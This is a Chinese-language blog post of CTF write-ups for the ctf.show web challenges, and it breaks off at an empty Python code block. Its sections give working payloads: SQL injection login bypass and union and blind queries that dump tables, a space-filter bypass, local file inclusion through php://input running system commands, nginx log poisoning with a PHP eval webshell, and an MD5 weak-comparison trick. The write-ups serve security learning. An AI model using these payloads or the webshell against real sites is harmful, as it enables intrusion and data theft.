---
title: CTF秀WEB-WP（持续更新）
date: 2020-10-13 17:32:00
categories: CTF做题记录
---
>本文仅为做题记录，可能不够详细，不懂的命令建议百度查询

<!-- TOC -->

- [web签到题](#web签到题)
- [web2](#web2)
- [web3](#web3)
- [web4](#web4)
- [web5](#web5)
- [web6](#web6)
- [web7](#web7)

<!-- /TOC -->
<!--more-->
# web签到题
没啥说的，源码base64解密

---
# web2
>简单sql

万能密码登陆，`username=admin' or(1)#&password=admin`，没啥东西，union联合查询，发现回显在第二个
![union](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.08jzott3rx95.png)
查表：`username=admin' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()#&password=admin`\
查列：`username=admin' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'#&password=admin`\
查字段：`username=admin' union select 1,group_concat(flag),3 from flag#&password=admin`
以上可以理解为固定用法

---
# web3
>LFI[不错的文章](https://www.freebuf.com/articles/web/182280.html)

给了源码` <?php include($_GET['url']);?> `，这题我用了伪协议，通过`php://input`来执行命令或者写入木马\
`GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input`，`POST：<?php system('ls');?>`
![ls](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.4rtzgtm95op.png)
`GET：http://6a859db9-97c1-4261-b3c9-5b234c4a9c2b.chall.ctf.show/?url=php://input`，`POST：<?php system('cat ctf_go_go_go');?>`
![flag](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.hm3ykdje0p7.png)

---
# web4
>nginx日志注入，LFI（local File Include）

这题再用上面的就不行了，应该是php伪协议被ban了，但是还能包含`/etc/passwd`，抓包可以知道服务器是nginx，其默认日志路径在`/var/log/nginx/access.log`和`/var/log/nginx/error.log`，其中access可以包含成功，抓包直接在`User-Agent`输入一句话木马：`<?php @eval($_POST['yq1ng']);?>`，此请求头用来标识客户端用的什么浏览器进行访问的
![yq1ng](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.we8vhqra5r.png)
![AntSword](https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/image.g6wz0avu9kn.png)
flag在`/var/www/flag.txt`

---
# web5
>md5碰撞\
`ctype_alpha()` --> 做纯字符检测

开箱送源码
```php
<?php
$flag="";
$v1=$_GET['v1'];
$v2=$_GET['v2'];
if(isset($v1) && isset($v2)){
    if(!ctype_alpha($v1)){
        die("v1 error");
    }
    if(!is_numeric($v2)){
        die("v2 error");
    }
    if(md5($v1)==md5($v2)){
        echo $flag;
    }
}else{
    echo "where is flag?";
}
?>
```
>介绍一个函数`ctype_alpha`\
用法：ctype_alpha ( string $text ) : bool\
用途：做纯字符检测\
返回值：如果在当前语言环境中 text 里的每个字符都是一个字母，那么就返回TRUE，反之则返回FALSE

可以做md5碰撞，[CTF中常见php-MD5()函数漏洞](https://blog.csdn.net/qq_19980431/article/details/83018232)
payload：`?v1=QNKCDZO&v2=240610708`

---
# web6
>空格绕过

与web2不同，本题含waf，先试了万能密码`username=admin' or(1)#&password=admin`，回显：   sql inject error\
逐个删除万能密码字符，发现过滤的是空格，这好说，空格一般可以由`/**/`,`回车(%0a)`,\`,`tab`绕过，一般我用`/**/`，注入语句和web2一样，只是把空格替换了\
爆库：`username=admin%27/**/union/**/select/**/1,database(),3#&password=a`(回显web2，一样的数据库-.-)\
爆表：`username=admin%27/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&password=a`(flag,user)\
爆列：`username=admin'/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#&password=a`(flag)\
爆字：`username=admin'/**/union/**/select/**/1,group_concat(flag),3/**/from/**/flag#&password=a`

---
# web7

随便进一个链接，发现URL可能有LFI，并不是，可能还是注入？单引号没用，试试整形注入，`?id=1/**/or(1)`，文章全出来了，就是这个了；不过联合查询没用，可以试试ascii，payload：`?id=-1/**/or/**/ascii(substr(database(),1,1))=119`，有回显说明当前字符为119即'w'，上脚本
```python
